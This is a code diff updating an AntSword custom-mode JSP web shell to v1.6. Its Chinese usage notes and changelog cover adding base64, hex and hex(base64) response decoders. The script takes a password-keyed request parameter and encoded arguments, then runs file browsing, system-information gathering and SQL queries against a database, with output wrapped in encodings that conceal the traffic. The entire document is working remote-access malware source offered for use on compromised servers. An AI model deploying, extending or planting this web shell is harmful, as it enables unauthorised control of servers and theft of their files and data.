@@ -12,18 +12,22 @@
 ———————————————————————————————————————————————
 
 说明：
- 1. AntSword >= v1.1-dev
+ 1. AntSword >= v2.1.0
  2. 创建 Shell 时选择 custom 模式连接
  3. 数据库连接：
     com.mysql.jdbc.Driver
     jdbc:mysql://localhost/test?user=root&password=123456
 
     注意：以上是两行
- 4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
+ 4. 本脚本中 encoder/decoder 与 AntSword 添加 Shell 时选择的 encoder/decoder 要一致，如果选择 default 则需要将值设置为空
 
 已知问题：
  1. 文件管理遇到中文文件名显示的问题
 ChangeLog:
+  v1.6
+    1. 新增 4 种解码器支持
+  v1.5
+    1. 修正 base64 编码器下连接数据库 characterEncoding 出错
   v1.4
     1. 修正 windows 下基础路径获取盘符会出现小写的情况
   v1.3
@@ -48,7 +52,12 @@ ChangeLog:
     String encoder = "";       // default
     // String encoder = "base64"; //base64
     // String encoder = "hex";    //hex(推荐)
-    String cs = "UTF-8"; // 编码方式
+    String cs = "UTF-8"; // 字符编码
+    // 数据解码 4 选 1
+    String decoder = "";
+    // String decoder = "base64"; // base64 中文正常
+    // String decoder = "hex"; // hex 中文可能有问题
+    // String decoder = "hex_base64"; // hex(base64) // 中文正常
 // ################################################
 
     String EC(String s) throws Exception {
@@ -89,7 +98,7 @@ ChangeLog:
         conn = (EC(conn));
         String[] x = conn.trim().replace("\r\n", "\n").split("\n");
         Class.forName(x[0].trim());
-        String url = x[1] + "&characterEncoding=" + decode(EC(encode),encoder);
+        String url = x[1] + "&characterEncoding=" +encode;
         Connection c = DriverManager.getConnection(url);
         Statement stmt = c.createStatement();
         ResultSet rs = stmt.executeQuery(sql);
@@ -344,6 +353,26 @@ ChangeLog:
         return fileHexContext;
     }
 
+    String asenc(String str, String decode){
+        if(decode.equals("hex") || decode=="hex"){
+            String ret = "";
+            for (int i = 0; i < str.length(); i++) {
+                int ch = (int) str.charAt(i);
+                String s4 = Integer.toHexString(ch);
+                ret = ret + s4;
+            }
+            return ret;
+        }else if(decode.equals("base64") || decode == "base64"){
+            String sb = "";
+            sun.misc.BASE64Encoder encoder = new sun.misc.BASE64Encoder();
+            sb = encoder.encode(str.getBytes());
+            return sb;
+        }else if(decode.equals("hex_base64") || decode == "hex_base64"){
+            return asenc(asenc(str, "base64"), "hex");
+        }
+        return str;
+    }
+
     String decode(String str) {
         byte[] bt = null;
         try {
@@ -389,6 +418,7 @@ ChangeLog:
     response.setContentType("text/html");
     request.setCharacterEncoding(cs);
     response.setCharacterEncoding(cs);
+    StringBuffer output = new StringBuffer("");
     StringBuffer sb = new StringBuffer("");
     try {
         String funccode = EC(request.getParameter(Pwd) + "");
@@ -397,7 +427,7 @@ ChangeLog:
         String z2 = decode(EC(request.getParameter("z2") + ""), encoder);
         String z3 = decode(EC(request.getParameter("z3") + ""), encoder);
         String[] pars = { z0, z1, z2, z3};
-        sb.append("->" + "|");
+        output.append("->" + "|");
 
         if (funccode.equals("B")) {
             sb.append(FileTreeCode(pars[1]));
@@ -435,8 +465,9 @@ ChangeLog:
             sb.append(SysInfoCode(request));
         }
     } catch (Exception e) {
-        sb.append("ERROR" + "://" + e.toString());
+        sb.append("ERROR" + ":// " + e.toString());
     }
-    sb.append("|" + "<-");
-    out.print(sb.toString());
+    output.append(asenc(sb.toString(), decoder));
+    output.append("|" + "<-");
+    out.print(output.toString());
 %>
